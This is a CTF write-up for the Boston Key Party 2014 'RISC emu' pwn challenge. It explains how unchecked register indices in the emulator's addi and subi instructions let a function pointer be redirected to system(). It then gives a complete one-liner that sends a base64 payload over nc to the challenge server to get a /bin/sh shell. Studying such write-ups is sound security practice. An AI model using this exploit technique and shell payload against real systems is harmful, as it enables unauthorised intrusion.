## Boston Key Party CTF 2014 - RISC emu (pwn 100pt)
##### 28/02 - 02/03/2014 (48hr)
___

### Description: 
	nobody cares about this service nc 54.218.22.41 4545

```
	http://bostonkeyparty.net/challenges/emu-c7c4671145c5bb6ad48682ec0c58b831
```

### Solution

Functions `addi` and `subi` do not check whether register index is in range [0,8). Thus, if we
execute the command:
```
	subi r64, 0x1330
```

We'll make `mor_604C50` to point at `.plt.system()`, without destroying the cookie. Then we can
simply call `mor` (opcode 0x8) with `/bin/sh` as argument. The exploit is as simple as this:

```
((python -c 'print "\x03\x40\x13\x30\x08/bin/sh\x00"' | base64); cat) | nc 54.218.22.41 4545
```
___
